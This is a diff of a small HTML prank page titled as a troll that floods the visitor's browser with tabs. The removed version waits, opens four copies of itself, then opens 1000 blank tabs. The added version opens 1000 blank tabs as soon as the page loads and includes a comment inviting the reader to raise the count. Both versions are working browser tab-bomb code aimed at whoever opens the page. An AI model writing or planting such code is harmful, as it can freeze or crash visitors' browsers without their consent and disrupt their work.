@@ -1,41 +1,23 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Troll</title>
-<style>
-  body {
-    margin: 0; 
-    background: black; 
-    color: white; 
-    display: flex; 
-    justify-content: center; 
-    align-items: center; 
-    height: 100vh; 
-    font-family: monospace, monospace;
-    font-size: 2rem;
-    user-select: none;
-  }
-</style>
+  <title>.</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      margin-top: 100px;
+    }
+  </style>
 </head>
-<body>
-  <div>pov: u are getting trolled</div>
+<body onload="openTabs()">
+  <h1>pov: u were touched</h1>
   <script>
-    // Wait 5 seconds before opening duplicates and tabs
-    setTimeout(() => {
-      // Open 4 duplicates of self (same URL, same page)
-      for (let i = 0; i < 4; i++) {
-        window.open(window.location.href, '_blank');
+    function openTabs() {
+      for (let i = 0; i < 1000; i++) { // Change 1000 to any number of tabs you want
+        window.open('about:blank', '_blank');
       }
-      // After opening duplicates, wait another 5 seconds
-      setTimeout(() => {
-        // Now open 1000 tabs from this window
-        for (let i = 0; i < 1000; i++) {
-          window.open('about:blank', '_blank');
-        }
-      }, 5000);
-    }, 5000);
+    }
   </script>
 </body>
 </html>
